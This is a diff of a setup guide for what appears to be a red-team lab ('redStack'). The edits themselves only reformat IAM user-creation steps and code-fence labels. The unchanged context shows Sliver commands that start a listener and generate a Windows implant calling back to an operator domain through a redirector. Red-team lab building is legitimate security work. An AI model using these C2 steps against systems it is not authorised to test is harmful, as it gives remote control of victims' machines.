@@ -203,13 +203,15 @@ Least privilege adds meaningful protection when credentials could expose things 
 <details>
 <summary>How to create the IAM user and attach AdministratorAccess (click to expand)</summary>
 
-1. Go to **IAM Console** > **Users** > **Create user**
-2. Set a username (e.g., `redS-operator`)
-3. Under **Permissions**, choose **Attach policies directly** and search for `AdministratorAccess`
-4. Check the box next to `AdministratorAccess` and click **Next**, then **Create user**
-5. Open the user, go to **Security credentials**, and click **Create access key**
-6. Select **Command Line Interface (CLI)**, acknowledge the recommendation, and click **Next**
-7. Copy or download the **Access Key ID** and **Secret Access Key**. The secret is shown only once.
+```bash
+# 1. IAM Console > Users > Create user
+# 2. Username: redS-operator
+# 3. Permissions > Attach policies directly > search "AdministratorAccess"
+# 4. Check AdministratorAccess > Next > Create user
+# 5. Open the new user > Security credentials > Create access key
+# 6. Select: Command Line Interface (CLI) > acknowledge > Next
+# 7. Copy the Access Key ID and Secret Access Key  (the secret is shown only once)
+```
 
 </details>
 
@@ -224,16 +226,18 @@ If you are not sure which account type you have, go back and re-read the dedicat
 <details>
 <summary>How to create the IAM user and attach the least-privilege policy (click to expand)</summary>
 
-1. Go to **IAM Console** > **Users** > **Create user**
-2. Set a username (e.g., `redS-operator`)
-3. Under **Permissions**, choose **Attach policies directly** > **Create policy**
-4. Select the **JSON** tab and paste the policy below
-5. Name the policy (e.g., `redStack-least-privilege`) and click **Create policy**
-6. Back on the user creation screen, search for and attach the policy you just created
-7. Click **Next**, then **Create user**
-8. Open the user, go to **Security credentials**, and click **Create access key**
-9. Select **Command Line Interface (CLI)**, acknowledge the recommendation, and click **Next**
-10. Copy or download the **Access Key ID** and **Secret Access Key**. The secret is shown only once.
+```bash
+# 1.  IAM Console > Users > Create user
+# 2.  Username: redS-operator
+# 3.  Permissions > Attach policies directly > Create policy
+# 4.  Select the JSON tab and paste the policy shown below
+# 5.  Name the policy: redStack-least-privilege > Create policy
+# 6.  Back on the user creation screen, search for and attach redStack-least-privilege
+# 7.  Next > Create user
+# 8.  Open the new user > Security credentials > Create access key
+# 9.  Select: Command Line Interface (CLI) > acknowledge > Next
+# 10. Copy the Access Key ID and Secret Access Key  (the secret is shown only once)
+```
 
 </details>
 
@@ -493,7 +497,7 @@ terraform init
 
 **Expected Output:**
 
-```console
+```bash
 Initializing the backend...
 Initializing provider plugins...
 - Finding hashicorp/aws versions matching "~> 5.0"...
@@ -534,7 +538,7 @@ Type `yes` when prompted.
 
 **Expected Output:**
 
-```console
+```bash
 Apply complete! Resources: 50+ added, 0 changed, 0 destroyed.
 ```
 
@@ -732,7 +736,7 @@ Certbot will walk you through a few prompts:
 <details>
 <summary>Certbot walkthrough and expected output</summary>
 
-```console
+```bash
 Saving debug log to /var/log/letsencrypt/letsencrypt.log
 Enter email address (used for urgent renewal and security notices)
  (Enter 'c' to cancel): you@youremail.com
@@ -789,7 +793,7 @@ sudo /home/admin/test_redirector.sh
 <details>
 <summary>Key sections of expected output</summary>
 
-```console
+```bash
 ===== Redirector Connectivity Test =====
 
 [*] Apache status:
@@ -993,7 +997,7 @@ https://mythic:7443
 - Login: `mythic_admin`
 - Password: `sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD` (run on Mythic server)
 
-```console
+```yaml
 Navigate: Installed Services > C2 tab
 ```
 
@@ -1008,7 +1012,7 @@ If it shows **Stopped**, click **"Start Profile"**.
 
 ### Step 4.2: Generate Agent
 
-```console
+```yaml
 Navigate: Create Payload (left sidebar)
 ```
 
@@ -1130,7 +1134,7 @@ sliver-client
 
 **On first login only:** import the pre-built C2 profile. This only needs to be done once per deployment since Sliver stores it in its database:
 
-```console
+```bash
 sliver > c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack
 ```
 
@@ -1139,7 +1143,7 @@ sliver > c2profiles import --file /home/admin/redstack-c2-profile.json --name re
 
 **Start the HTTP listener:**
 
-```console
+```bash
 sliver > http --lhost 0.0.0.0 --lport 80
 ```
 
@@ -1154,7 +1158,7 @@ This starts a plain HTTP listener on port 80. The implant connects over HTTPS to
 
 Generate the implant using the `redstack` C2 profile:
 
-```console
+```bash
 sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe
 ```
 
@@ -1177,14 +1181,14 @@ Execute the implant on the Windows workstation. You should see a new session app
 
 ### Step 5.4: Test Sliver Session
 
-```console
+```bash
 sliver > sessions
 ```
 
 > [!TIP]
 > Use `sessions -i [SESSION_ID]` to list and interact with a session in one command instead of two steps.
 
-```console
+```bash
 sliver > use [SESSION_ID]
 
 sliver (SESSION) > whoami
@@ -1228,7 +1232,7 @@ The script logs everything to `~/havoc_build.log` and takes **15-25 minutes** to
 
 When complete you will see:
 
-```console
+```bash
 ===== Havoc Build Complete ...
 ```
 
@@ -1518,7 +1522,7 @@ Each Guacamole SSH connection should connect without a password prompt and land 
 
 **Symptoms:** Apache fails to start, `apache2ctl -S` shows:
 
-```console
+```bash
 Invalid command '404:', perhaps misspelled or defined by a module not included
 ```
 
@@ -1547,7 +1551,7 @@ sudo apache2ctl configtest && sudo systemctl reload apache2
 
 **Symptoms:** `mythic_nginx` container keeps restarting. Logs show:
 
-```console
+```bash
 [emerg] cannot load certificate "/etc/ssl/private/mythic-cert.crt": No such file or directory
 ```
 
